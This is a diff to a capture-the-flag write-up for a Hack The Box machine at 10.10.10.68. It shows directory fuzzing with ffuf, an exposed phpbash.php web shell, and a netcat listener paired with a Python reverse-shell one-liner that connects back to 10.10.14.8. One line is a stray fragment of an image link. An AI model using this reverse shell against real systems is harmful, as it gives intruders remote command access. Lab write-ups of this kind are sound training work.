@@ -23,13 +23,15 @@ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.tx
 ![image](https://github.com/regarmulia/HTB/assets/33616880/1aa722cc-5bca-43a1-b614-880a38a27f10)
 
 
-![image](https://user-images.githubusercontent.com/33616880/231079195-c3821e9c-f4e0-45b6-944d-696a708a6df7.png)
-
-
-https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
+```
+http://10.10.10.68/dev/phpbash.php
+```
+![image](https://github.com/regarmulia/HTB/assets/33616880/178b962b-8973-473b-995f-30bb71bbb29b)
+f-a8f4-c5d1578b3fa2)
 
 
 ```
+https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
 nc -nlvp 1234
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
